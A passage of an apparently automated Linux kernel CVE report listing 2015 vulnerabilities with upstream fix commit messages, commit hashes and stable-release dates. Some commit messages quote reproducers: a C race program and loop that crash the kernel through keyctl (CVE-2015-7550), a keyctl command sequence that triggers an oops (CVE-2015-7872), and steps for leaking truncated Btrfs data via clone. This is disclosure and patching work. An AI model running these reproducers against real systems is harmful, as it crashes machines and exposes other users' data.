    [135546.084481] ? do_audit_syscall_entry (include/trace/events/syscalls.h:16)
    [135546.085438] ? trace_buffer_unlock_commit (kernel/trace/trace.c:1749)
    [135546.085515] rds_ib_laddr_check(): addr 36.74.25.172 ret -99 node type -1
    
    Acked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com>
    Signed-off-by: Sasha Levin <sasha.levin@oracle.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/rds/connection.c |    6 ++++++
 1 file changed, 6 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-10-19
CVE: CVE-2015-6937
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-09-09
Linus Commit: 74e98eb085889b0d2d4908f59f6e00026063014f
Linus Tag: 4.3
Stable Date: 2016-03-03
Stable Commit: d596f66da6e1763fed39c8e76923a3a419d6f001
Stable Tag: 3.14.63

CVE-2015-7312:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-11-16
CVE: CVE-2015-7312
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2015-7312-fix
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-7513:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 0185604c2d82c560dab2f2933a18f797e74ab5a8
Author: Andrew Honig <ahonig@google.com>
Date:   Wed Nov 18 14:50:23 2015 -0800

    KVM: x86: Reload pit counters for all channels when restoring state
    
    Currently if userspace restores the pit counters with a count of 0
    on channels 1 or 2 and the guest attempts to read the count on those
    channels, then KVM will perform a mod of 0 and crash.  This will ensure
    that 0 values are converted to 65536 as per the spec.
    
    This is CVE-2015-7513.
    
    Signed-off-by: Andy Honig <ahonig@google.com>
    Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

 arch/x86/kvm/x86.c |    8 ++++++--
 1 file changed, 6 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-02-07
CVE: CVE-2015-7513
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-22
Linus Commit: 0185604c2d82c560dab2f2933a18f797e74ab5a8
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-7515:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 8e20cf2bce122ce9262d6034ee5d5b76fbb92f96
Author: Vladis Dronov <vdronov@redhat.com>
Date:   Tue Dec 1 13:09:17 2015 -0800

    Input: aiptek - fix crash on detecting device without endpoints
    
    The aiptek driver crashes in aiptek_probe() when a specially crafted USB
    device without endpoints is detected. This fix adds a check that the device
    has proper configuration expected by the driver. Also an error return value
    is changed to more matching one in one of the error paths.
    
    Reported-by: Ralf Spenneberg <ralf@spenneberg.net>
    Signed-off-by: Vladis Dronov <vdronov@redhat.com>
    Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>

 drivers/input/tablet/aiptek.c |    9 +++++++++
 1 file changed, 9 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2015-7515
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-02
Linus Commit: 8e20cf2bce122ce9262d6034ee5d5b76fbb92f96
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-7550:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.59.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit b4a1b4f5047e4f54e194681125c74c0aa64d637d
Author: David Howells <dhowells@redhat.com>
Date:   Fri Dec 18 01:34:26 2015 +0000

    KEYS: Fix race between read and revoke
    
    This fixes CVE-2015-7550.
    
    There's a race between keyctl_read() and keyctl_revoke().  If the revoke
    happens between keyctl_read() checking the validity of a key and the key's
    semaphore being taken, then the key type read method will see a revoked key.
    
    This causes a problem for the user-defined key type because it assumes in
    its read method that there will always be a payload in a non-revoked key
    and doesn't check for a NULL pointer.
    
    Fix this by making keyctl_read() check the validity of a key after taking
    semaphore instead of before.
    
    I think the bug was introduced with the original keyrings code.
    
    This was discovered by a multithreaded test program generated by syzkaller
    (http://github.com/google/syzkaller).  Here's a cleaned up version:
    
    	#include <sys/types.h>
    	#include <keyutils.h>
    	#include <pthread.h>
    	void *thr0(void *arg)
    	{
    		key_serial_t key = (unsigned long)arg;
    		keyctl_revoke(key);
    		return 0;
    	}
    	void *thr1(void *arg)
    	{
    		key_serial_t key = (unsigned long)arg;
    		char buffer[16];
    		keyctl_read(key, buffer, 16);
    		return 0;
    	}
    	int main()
    	{
    		key_serial_t key = add_key("user", "%", "foo", 3, KEY_SPEC_USER_KEYRING);
    		pthread_t th[5];
    		pthread_create(&th[0], 0, thr0, (void *)(unsigned long)key);
    		pthread_create(&th[1], 0, thr1, (void *)(unsigned long)key);
    		pthread_create(&th[2], 0, thr0, (void *)(unsigned long)key);
    		pthread_create(&th[3], 0, thr1, (void *)(unsigned long)key);
    		pthread_join(th[0], 0);
    		pthread_join(th[1], 0);
    		pthread_join(th[2], 0);
    		pthread_join(th[3], 0);
    		return 0;
    	}
    
    Build as:
    
    	cc -o keyctl-race keyctl-race.c -lkeyutils -lpthread
    
    Run as:
    
    	while keyctl-race; do :; done
    
    as it may need several iterations to crash the kernel.  The crash can be
    summarised as:
    
    	BUG: unable to handle kernel NULL pointer dereference at 0000000000000010
    	IP: [<ffffffff81279b08>] user_read+0x56/0xa3
    	...
    	Call Trace:
    	 [<ffffffff81276aa9>] keyctl_read_key+0xb6/0xd7
    	 [<ffffffff81277815>] SyS_keyctl+0x83/0xe0
    	 [<ffffffff815dbb97>] entry_SYSCALL_64_fastpath+0x12/0x6f
    
    Reported-by: Dmitry Vyukov <dvyukov@google.com>
    Signed-off-by: David Howells <dhowells@redhat.com>
    Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: stable@vger.kernel.org
    Signed-off-by: James Morris <james.l.morris@oracle.com>

 security/keys/keyctl.c |   18 +++++++++---------
 1 file changed, 9 insertions(+), 9 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-02-07
CVE: CVE-2015-7550
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-19
Linus Commit: b4a1b4f5047e4f54e194681125c74c0aa64d637d
Linus Tag: 4.4
Stable Date: 2016-01-22
Stable Commit: 92264cc9c4636340a492d78f8f2ae3b3424e7fdd
Stable Tag: 3.14.59

CVE-2015-7566:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.61.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit cb3232138e37129e88240a98a1d2aba2187ff57c
Author: Vladis Dronov <vdronov@redhat.com>
Date:   Tue Jan 12 15:10:50 2016 +0100

    USB: serial: visor: fix crash on detecting device without write_urbs
    
    The visor driver crashes in clie_5_attach() when a specially crafted USB
    device without bulk-out endpoint is detected. This fix adds a check that
    the device has proper configuration expected by the driver.
    
    Reported-by: Ralf Spenneberg <ralf@spenneberg.net>
    Signed-off-by: Vladis Dronov <vdronov@redhat.com>
    Fixes: cfb8da8f69b8 ("USB: visor: fix initialisation of UX50/TH55 devices")
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Johan Hovold <johan@kernel.org>

 drivers/usb/serial/visor.c |    6 ++++--
 1 file changed, 4 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-02-07
CVE: CVE-2015-7566
Break Date: 2010-10-22
Break Commit: cfb8da8f69b81d367b766888e83ec0483a31bf01
Break Tag: 2.6
Linus Fix Date: 2016-01-25
Linus Commit: cb3232138e37129e88240a98a1d2aba2187ff57c
Linus Tag: 4.5
Stable Date: 2016-02-17
Stable Commit: e3b75da93491acc980573d6f06472225f81c93fe
Stable Tag: 3.14.61

CVE-2015-7613:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.55.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit b9a532277938798b53178d5a66af6e2915cb27cf
Author: Linus Torvalds <torvalds@linux-foundation.org>
Date:   Wed Sep 30 12:48:40 2015 -0400

    Initialize msg/shm IPC objects before doing ipc_addid()
    
    As reported by Dmitry Vyukov, we really shouldn't do ipc_addid() before
    having initialized the IPC object state.  Yes, we initialize the IPC
    object in a locked state, but with all the lockless RCU lookup work,
    that IPC object lock no longer means that the state cannot be seen.
    
    We already did this for the IPC semaphore code (see commit e8577d1f0329:
    "ipc/sem.c: fully initialize sem_array before making it visible") but we
    clearly forgot about msg and shm.
    
    Reported-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Manfred Spraul <manfred@colorfullife.com>
    Cc: Davidlohr Bueso <dbueso@suse.de>
    Cc: stable@vger.kernel.org
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 ipc/msg.c  |   14 +++++++-------
 ipc/shm.c  |   13 +++++++------
 ipc/util.c |    8 ++++----
 3 files changed, 18 insertions(+), 17 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-10-19
CVE: CVE-2015-7613
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-09-30
Linus Commit: b9a532277938798b53178d5a66af6e2915cb27cf
Linus Tag: 4.3
Stable Date: 2015-10-22
Stable Commit: 58c01a5074bc551a151b6b44f56ed40debd6b99d
Stable Tag: 3.14.55

CVE-2015-7799:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.60.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 0baa57d8dc32db78369d8b5176ef56c5e2e18ab3
Author: Ben Hutchings <ben@decadent.org.uk>
Date:   Sun Nov 1 16:21:24 2015 +0000

    isdn_ppp: Add checks for allocation failure in isdn_ppp_open()
    
    Compile-tested only.
    
    Signed-off-by: Ben Hutchings <ben@decadent.org.uk>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 drivers/isdn/i4l/isdn_ppp.c |    6 ++++++
 1 file changed, 6 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-10-19
CVE: CVE-2015-7799
Break Date: 2005-04-16
Break Commit: 1da177e4c3f41524e886b7f1b8a0c1fc7321cac2
Break Tag: 2.6
Linus Fix Date: 2015-11-02
Linus Commit: 0baa57d8dc32db78369d8b5176ef56c5e2e18ab3
Linus Tag: 4.4
Stable Date: 2016-01-28
Stable Commit: b22b5281ff0fae948bda39e2ecb7c135410eeee5
Stable Tag: 3.14.60

CVE-2015-7799:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.60.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 4ab42d78e37a294ac7bc56901d563c642e03c4ae
Author: Ben Hutchings <ben@decadent.org.uk>
Date:   Sun Nov 1 16:22:53 2015 +0000

    ppp, slip: Validate VJ compression slot parameters completely
    
    Currently slhc_init() treats out-of-range values of rslots and tslots
    as equivalent to 0, except that if tslots is too large it will
    dereference a null pointer (CVE-2015-7799).
    
    Add a range-check at the top of the function and make it return an
    ERR_PTR() on error instead of NULL.  Change the callers accordingly.
    
    Compile-tested only.
    
    Reported-by:  <guoyonggang@360.cn>
    References: http://article.gmane.org/gmane.comp.security.oss.general/17908
    Signed-off-by: Ben Hutchings <ben@decadent.org.uk>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 drivers/isdn/i4l/isdn_ppp.c   |   10 ++++------
 drivers/net/ppp/ppp_generic.c |    6 ++----
 drivers/net/slip/slhc.c       |   12 ++++++++----
 drivers/net/slip/slip.c       |    2 +-
 4 files changed, 15 insertions(+), 15 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-10-19
CVE: CVE-2015-7799
Break Date: 2005-04-16
Break Commit: 1da177e4c3f41524e886b7f1b8a0c1fc7321cac2
Break Tag: 2.6
Linus Fix Date: 2015-11-02
Linus Commit: 4ab42d78e37a294ac7bc56901d563c642e03c4ae
Linus Tag: 4.4
Stable Date: 2016-01-28
Stable Commit: 5148857f5d4c812cc918cf4627f7880521e987eb
Stable Tag: 3.14.60

CVE-2015-7833:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa52bd506f274b7619955917abfde355e3d19ffe
Author: Vladis Dronov <vdronov@redhat.com>
Date:   Mon Nov 16 15:55:11 2015 -0200

    [media] usbvision: fix crash on detecting device with invalid configuration
    
    The usbvision driver crashes when a specially crafted usb device with invalid
    number of interfaces or endpoints is detected. This fix adds checks that the
    device has proper configuration expected by the driver.
    
    Reported-by: Ralf Spenneberg <ralf@spenneberg.net>
    Signed-off-by: Vladis Dronov <vdronov@redhat.com>
    Signed-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>

 drivers/media/usb/usbvision/usbvision-video.c |   16 +++++++++++++++-
 1 file changed, 15 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-10-19
CVE: CVE-2015-7833
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-11-19
Linus Commit: fa52bd506f274b7619955917abfde355e3d19ffe
Linus Tag: 4.5
Stable Date: 2016-04-20
Stable Commit: 5cdf1343689212304bcb841037a3bd4bab33d6cb
Stable Tag: 3.14.67

CVE-2015-7833:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit d5468d7afaa9c9e961e150f0455a14a9f4872a98
Author: Vladis Dronov <vdronov@redhat.com>
Date:   Sun Jan 31 14:14:52 2016 -0200

    [media] usbvision: revert commit 588afcc1
    
    Commit 588afcc1c0e4 ("[media] usbvision fix overflow of interfaces
    array")' should be reverted, because:
    
    * "!dev->actconfig->interface[ifnum]" won't catch a case where the value
    is not NULL but some garbage. This way the system may crash later with
    GPF.
    
    * "(ifnum >= USB_MAXINTERFACES)" does not cover all the error
    conditions. "ifnum" should be compared to "dev->actconfig->
    desc.bNumInterfaces", i.e. compared to the number of "struct
    usb_interface" kzalloc()-ed, not to USB_MAXINTERFACES.
    
    * There is a "struct usb_device" leak in this error path, as there is
    usb_get_dev(), but no usb_put_dev() on this path.
    
    * There is a bug of the same type several lines below with number of
    endpoints. The code is accessing hard-coded second endpoint
    ("interface->endpoint[1].desc") which may not exist. It would be great
    to handle this in the same patch too.
    
    * All the concerns above are resolved by already-accepted commit fa52bd50
    ("[media] usbvision: fix crash on detecting device with invalid
    configuration")
    
    * Mailing list message:
    http://www.spinics.net/lists/linux-media/msg94832.html
    
    Signed-off-by: Vladis Dronov <vdronov@redhat.com>
    Signed-off-by: Hans Verkuil <hans.verkuil@cisco.com>
    Cc: <stable@vger.kernel.org>      # for v4.5
    Signed-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>

 drivers/media/usb/usbvision/usbvision-video.c |    7 -------
 1 file changed, 7 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-10-19
CVE: CVE-2015-7833
Break Date: 2015-11-17
Break Commit: 588afcc1c0e45358159090d95bf7b246fb67565f
Break Tag: 4.5
Linus Fix Date: 2016-04-20
Linus Commit: d5468d7afaa9c9e961e150f0455a14a9f4872a98
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-7837:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-10-15
CVE: CVE-2015-7837
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2015-7837
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-7872:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.59.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit f05819df10d7b09f6d1eb6f8534a8f68e5a4fe61
Author: David Howells <dhowells@redhat.com>
Date:   Thu Oct 15 17:21:37 2015 +0100

    KEYS: Fix crash when attempt to garbage collect an uninstantiated keyring
    
    The following sequence of commands:
    
        i=`keyctl add user a a @s`
        keyctl request2 keyring foo bar @t
        keyctl unlink $i @s
    
    tries to invoke an upcall to instantiate a keyring if one doesn't already
    exist by that name within the user's keyring set.  However, if the upcall
    fails, the code sets keyring->type_data.reject_error to -ENOKEY or some
    other error code.  When the key is garbage collected, the key destroy
    function is called unconditionally and keyring_destroy() uses list_empty()
    on keyring->type_data.link - which is in a union with reject_error.
    Subsequently, the kernel tries to unlink the keyring from the keyring names
    list - which oopses like this:
    
    	BUG: unable to handle kernel paging request at 00000000ffffff8a
    	IP: [<ffffffff8126e051>] keyring_destroy+0x3d/0x88
    	...
    	Workqueue: events key_garbage_collector
    	...
    	RIP: 0010:[<ffffffff8126e051>] keyring_destroy+0x3d/0x88
    	RSP: 0018:ffff88003e2f3d30  EFLAGS: 00010203
    	RAX: 00000000ffffff82 RBX: ffff88003bf1a900 RCX: 0000000000000000
    	RDX: 0000000000000000 RSI: 000000003bfc6901 RDI: ffffffff81a73a40
    	RBP: ffff88003e2f3d38 R08: 0000000000000152 R09: 0000000000000000
    	R10: ffff88003e2f3c18 R11: 000000000000865b R12: ffff88003bf1a900
    	R13: 0000000000000000 R14: ffff88003bf1a908 R15: ffff88003e2f4000
    	...
    	CR2: 00000000ffffff8a CR3: 000000003e3ec000 CR4: 00000000000006f0
    	...
    	Call Trace:
    	 [<ffffffff8126c756>] key_gc_unused_keys.constprop.1+0x5d/0x10f
    	 [<ffffffff8126ca71>] key_garbage_collector+0x1fa/0x351
    	 [<ffffffff8105ec9b>] process_one_work+0x28e/0x547
    	 [<ffffffff8105fd17>] worker_thread+0x26e/0x361
    	 [<ffffffff8105faa9>] ? rescuer_thread+0x2a8/0x2a8
    	 [<ffffffff810648ad>] kthread+0xf3/0xfb
    	 [<ffffffff810647ba>] ? kthread_create_on_node+0x1c2/0x1c2
    	 [<ffffffff815f2ccf>] ret_from_fork+0x3f/0x70
    	 [<ffffffff810647ba>] ? kthread_create_on_node+0x1c2/0x1c2
    
    Note the value in RAX.  This is a 32-bit representation of -ENOKEY.
    
    The solution is to only call ->destroy() if the key was successfully
    instantiated.
    
    Reported-by: Dmitry Vyukov <dvyukov@google.com>
    Signed-off-by: David Howells <dhowells@redhat.com>
    Tested-by: Dmitry Vyukov <dvyukov@google.com>

 security/keys/gc.c |    6 ++++--
 1 file changed, 4 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-11-16
CVE: CVE-2015-7872
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-10-15
Linus Commit: f05819df10d7b09f6d1eb6f8534a8f68e5a4fe61
Linus Tag: 4.3
Stable Date: 2016-01-22
Stable Commit: aad1f1b859a047397ffe0f0044d12408b2df94c9
Stable Tag: 3.14.59

CVE-2015-7884:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit eda98796aff0d9bf41094b06811f5def3b4c333c
Author: Salva Peir <speirofr@gmail.com>
Date:   Wed Oct 7 07:09:26 2015 -0300

    [media] media/vivid-osd: fix info leak in ioctl
    
    The vivid_fb_ioctl() code fails to initialize the 16 _reserved bytes of
    struct fb_vblank after the ->hcount member. Add an explicit
    memset(0) before filling the structure to avoid the info leak.
    
    Signed-off-by: Salva Peir <speirofr@gmail.com>
    Signed-off-by: Hans Verkuil <hans.verkuil@cisco.com>
    Signed-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>

 drivers/media/platform/vivid/vivid-osd.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-12-28
CVE: CVE-2015-7884
Break Date: 2014-09-02
Break Commit: ad4e02d5081d9da38b5b91886e5fa71f0505d607
Break Tag: 3.19
Linus Fix Date: 2015-10-20
Linus Commit: eda98796aff0d9bf41094b06811f5def3b4c333c
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-7885:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 4b6184336ebb5c8dc1eae7f7ab46ee608a748b05
Author: Salva Peir <speirofr@gmail.com>
Date:   Wed Oct 14 17:48:02 2015 +0200

    staging/dgnc: fix info leak in ioctl
    
    The dgnc_mgmt_ioctl() code fails to initialize the 16 _reserved bytes of
    struct digi_dinfo after the ->dinfo_nboards member. Add an explicit
    memset(0) before filling the structure to avoid the info leak.
    
    Signed-off-by: Salva Peir <speirofr@gmail.com>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/staging/dgnc/dgnc_mgmt.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-12-28
CVE: CVE-2015-7885
Break Date: 2013-08-02
Break Commit: 0b99d58902dd82fa51216eb8e0d6ddd8c43e90e4
Break Tag: 3.12
Linus Fix Date: 2015-10-16
Linus Commit: 4b6184336ebb5c8dc1eae7f7ab46ee608a748b05
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-7990:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.63.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 8c7188b23474cca017b3ef354c4a58456f68303a
Author: Quentin Casasnovas <quentin.casasnovas@oracle.com>
Date:   Tue Nov 24 17:13:21 2015 -0500

    RDS: fix race condition when sending a message on unbound socket
    
    Sasha's found a NULL pointer dereference in the RDS connection code when
    sending a message to an apparently unbound socket.  The problem is caused
    by the code checking if the socket is bound in rds_sendmsg(), which checks
    the rs_bound_addr field without taking a lock on the socket.  This opens a
    race where rs_bound_addr is temporarily set but where the transport is not
    in rds_bind(), leading to a NULL pointer dereference when trying to
    dereference 'trans' in __rds_conn_create().
    
    Vegard wrote a reproducer for this issue, so kindly ask him to share if
    you're interested.
    
    I cannot reproduce the NULL pointer dereference using Vegard's reproducer
    with this patch, whereas I could without.
    
    Complete earlier incomplete fix to CVE-2015-6937:
    
      74e98eb08588 ("RDS: verify the underlying transport exists before creating a connection")
    
    Cc: David S. Miller <davem@davemloft.net>
    Cc: stable@vger.kernel.org
    
    Reviewed-by: Vegard Nossum <vegard.nossum@oracle.com>
    Reviewed-by: Sasha Levin <sasha.levin@oracle.com>
    Acked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com>
    Signed-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/rds/connection.c |    6 ------
 net/rds/send.c       |    4 +++-
 2 files changed, 3 insertions(+), 7 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-12-28
CVE: CVE-2015-7990
Break Date: 2015-09-09
Break Commit: 74e98eb085889b0d2d4908f59f6e00026063014f
Break Tag: 4.3
Linus Fix Date: 2015-11-24
Linus Commit: 8c7188b23474cca017b3ef354c4a58456f68303a
Linus Tag: 4.4
Stable Date: 2016-03-03
Stable Commit: ef8d4d93d242c0153d00ab782a18befdbef35dcc
Stable Tag: 3.14.63

CVE-2015-8019:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2015-8019
Break Date: 2015-07-15
Break Commit: 89c22d8c3b278212eef6a8cc66b570bc840a6f5a
Break Tag: 4.2
Linus Fix Date: -
Linus Commit: local-2015-8019
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-8104:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit cbdb967af3d54993f5814f1cee0ed311a055377d
Author: Paolo Bonzini <pbonzini@redhat.com>
Date:   Tue Nov 10 09:14:39 2015 +0100

    KVM: svm: unconditionally intercept #DB
    
    This is needed to avoid the possibility that the guest triggers
    an infinite stream of #DB exceptions (CVE-2015-8104).
    
    VMX is not affected: because it does not save DR6 in the VMCS,
    it already intercepts #DB unconditionally.
    
    Reported-by: Jan Beulich <jbeulich@suse.com>
    Cc: stable@vger.kernel.org
    Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

 arch/x86/kvm/svm.c |   14 +++-----------
 1 file changed, 3 insertions(+), 11 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-11-16
CVE: CVE-2015-8104
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-11-10
Linus Commit: cbdb967af3d54993f5814f1cee0ed311a055377d
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2015-0272:
CVE-2015-8215:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.63.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 77751427a1ff25b27d47a4c36b12c3c8667855ac
Author: Marcelo Leitner <mleitner@redhat.com>
Date:   Mon Feb 23 11:17:13 2015 -0300

    ipv6: addrconf: validate new MTU before applying it
    
    Currently we don't check if the new MTU is valid or not and this allows
    one to configure a smaller than minimum allowed by RFCs or even bigger
    than interface own MTU, which is a problem as it may lead to packet
    drops.
    
    If you have a daemon like NetworkManager running, this may be exploited
    by remote attackers by forging RA packets with an invalid MTU, possibly
    leading to a DoS. (NetworkManager currently only validates for values
    too small, but not for too big ones.)
    
    The fix is just to make sure the new value is valid. That is, between
    IPV6_MIN_MTU and interface's MTU.
    
    Note that similar check is already performed at
    ndisc_router_discovery(), for when kernel itself parses the RA.
    
    Signed-off-by: Marcelo Ricardo Leitner <mleitner@redhat.com>
    Signed-off-by: Sabrina Dubroca <sd@queasysnail.net>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/ipv6/addrconf.c |   17 ++++++++++++++++-
 1 file changed, 16 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2015-11-17
CVE: CVE-2015-0272
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-02-23
Linus Commit: 77751427a1ff25b27d47a4c36b12c3c8667855ac
Linus Tag: 4.0
Stable Date: 2016-03-03
Stable Commit: db449d873870aee9161edb9259d72254987ad7c0
Stable Tag: 3.14.63

CVE-2015-8374:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 0305cd5f7fca85dae392b9ba85b116896eb7c1c7
Author: Filipe Manana <fdmanana@suse.com>
Date:   Fri Oct 16 12:34:25 2015 +0100

    Btrfs: fix truncation of compressed and inlined extents
    
    When truncating a file to a smaller size which consists of an inline
    extent that is compressed, we did not discard (or made unusable) the
    data between the new file size and the old file size, wasting metadata
    space and allowing for the truncated data to be leaked and the data
    corruption/loss mentioned below.
    We were also not correctly decrementing the number of bytes used by the
    inode, we were setting it to zero, giving a wrong report for callers of
    the stat(2) syscall. The fsck tool also reported an error about a mismatch
    between the nbytes of the file versus the real space used by the file.
    
    Now because we weren't discarding the truncated region of the file, it
    was possible for a caller of the clone ioctl to actually read the data
    that was truncated, allowing for a security breach without requiring root
    access to the system, using only standard filesystem operations. The
    scenario is the following:
    
       1) User A creates a file which consists of an inline and compressed
          extent with a size of 2000 bytes - the file is not accessible to
          any other users (no read, write or execution permission for anyone
          else);
    
       2) The user truncates the file to a size of 1000 bytes;
    
       3) User A makes the file world readable;
    
       4) User B creates a file consisting of an inline extent of 2000 bytes;
    
       5) User B issues a clone operation from user A's file into its own
          file (using a length argument of 0, clone the whole range);
    
       6) User B now gets to see the 1000 bytes that user A truncated from
          its file before it made its file world readbale. User B also lost
